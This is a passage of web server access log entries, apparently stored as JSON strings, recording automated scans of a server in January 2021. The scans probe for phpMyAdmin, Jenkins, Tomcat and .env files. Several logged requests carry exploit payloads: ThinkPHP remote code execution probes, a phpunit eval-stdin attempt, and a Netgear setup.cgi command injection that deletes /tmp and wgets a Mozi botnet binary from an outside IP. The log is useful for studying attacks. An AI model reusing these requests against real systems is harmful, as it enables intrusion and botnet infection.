      "127.0.0.1 - - [29/Jan/2021:05:56:28 +0000] \"GET /phpmyadmin2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:28 +0000] \"GET /phpmyadmin2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:29 +0000] \"GET /phpmyadmin2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:30 +0000] \"GET /phpmyadmin2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:31 +0000] \"GET /phpmyadmin2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:31 +0000] \"GET /phpmyadmin2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:32 +0000] \"GET /phpmyadmin2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:32 +0000] \"GET /index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:07:04:53 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:07:04:53 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - uQFc9urR [29/Jan/2021:07:04:53 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - suK7GB6T [29/Jan/2021:07:59:07 +0000] \"GET /manager/html/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:08:34:00 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:08:34:01 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - fGsQzYba [29/Jan/2021:08:34:02 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:09:32:55 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:09:32:56 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:09:32:58 +0000] \"GET /thinkphp/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:09:32:59 +0000] \"GET /html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:09:33:00 +0000] \"GET /public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:09:33:03 +0000] \"GET /TP/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:09:33:05 +0000] \"GET /elrekt.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:09:33:05 +0000] \"GET /index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:10:05:36 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [29/Jan/2021:10:29:13 +0000] \"GET /hudson HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 zgrab/0.x\"\n",
      "127.0.0.1 - - [29/Jan/2021:10:45:03 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:10:45:04 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - FkF30u83 [29/Jan/2021:10:45:04 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:10:57:43 +0000] \"GET /english/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:11:59:50 +0000] \"GET /solr/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:36:25 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:36:25 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:36:25 +0000] \"GET /thinkphp/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:36:25 +0000] \"GET /html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:36:26 +0000] \"GET /public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:36:26 +0000] \"GET /TP/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:36:26 +0000] \"GET /elrekt.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:36:26 +0000] \"GET /index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:38:59 +0000] \"GET /w00tw00t.at.blackhats.romanian.anti-sec:%29 HTTP/1.0\" 404 232 \"-\" \"ZmEu\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:38:59 +0000] \"GET /phpMyAdmin/scripts/setup.php HTTP/1.0\" 404 232 \"-\" \"ZmEu\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:35 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:35 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:35 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:35 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:36 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:36 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:36 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:37 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:37 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:12:45:37 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:13:11:33 +0000] \"POST /GponForm/diag_Form?images%2F= HTTP/1.0\" 404 232 \"-\" \"Hello, World\"\n",
      "127.0.0.1 - - [29/Jan/2021:14:08:20 +0000] \"GET /manager/text/list HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 zgrab/0.x\"\n",
      "127.0.0.1 - - [29/Jan/2021:14:48:02 +0000] \"GET /phpmyadmin/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:14:48:02 +0000] \"GET /pmd/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:14:48:02 +0000] \"GET /pmd/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:16:05:49 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:16:05:50 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - MCaId1VV [29/Jan/2021:16:05:50 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:16:50:39 +0000] \"GET /aaa9 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:16:50:41 +0000] \"GET /aab9 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:18:01:13 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:18:01:13 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - mNQC4qHG [29/Jan/2021:18:01:13 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:18:46:17 +0000] \"GET /.env HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:18:46:18 +0000] \"POST / HTTP/1.0\" 405 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:19:33:28 +0000] \"GET /setup.cgi?cmd=rm+-rf+%2Ftmp%2F%2A&curpath=%2F&currentsetting.htm=1&next_file=netgear.cfg&sh+netgear=&todo=syscmd&wget+http%3A%2F%2F119.36.24.104%3A50540%2FMozi.m+-O+%2Ftmp%2Fnetgear= HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:20:32:54 +0000] \"GET /swagger HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [29/Jan/2021:20:47:08 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:20:47:08 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - Tf0rB6VG [29/Jan/2021:20:47:09 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:20:52:03 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [29/Jan/2021:21:53:40 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
      "127.0.0.1 - - [30/Jan/2021:00:32:02 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [30/Jan/2021:00:32:47 +0000] \"GET /english/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:00:59:37 +0000] \"GET /webfig/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:01:38:15 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:01:38:16 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - V9AQlcwo [30/Jan/2021:01:38:16 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:01:31 +0000] \"GET /ok.txt HTTP/1.0\" 404 232 \"-\" \"python-requests/2.25.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:12 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:12 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:13 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:13 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:14 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:14 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:14 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:14 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:15 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:03:57:15 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:05:25:07 +0000] \"GET /boaform/admin/formLogin?psd=ec8&username=ec8 HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:06:54:18 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:06:54:19 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - Rno3gdMw [30/Jan/2021:06:54:19 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:09:10:35 +0000] \"GET /0bef HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:10:08:56 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
      "127.0.0.1 - - [30/Jan/2021:11:12:30 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [30/Jan/2021:11:12:30 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [30/Jan/2021:11:46:22 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [30/Jan/2021:14:40:14 +0000] \"GET /.env HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:14:40:16 +0000] \"POST / HTTP/1.0\" 405 178 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\"\n",
      "127.0.0.1 - 0YOOYERe [30/Jan/2021:15:58:20 +0000] \"GET /manager/html/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:31 +0000] \"GET /phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:31 +0000] \"GET /phpMyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:31 +0000] \"GET /phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:32 +0000] \"GET /phpmyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:32 +0000] \"GET /mysql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:32 +0000] \"GET /database/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:33 +0000] \"GET /phpmyadmin1/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:33 +0000] \"GET /phpmyadmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:33 +0000] \"GET /phpmyadmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:34 +0000] \"GET /phpmyadmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:34 +0000] \"GET /phpmyadmin5/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:34 +0000] \"GET /phpMyAdmin1/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:35 +0000] \"GET /phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:35 +0000] \"GET /phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:15:59:36 +0000] \"GET /phpMyAdmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
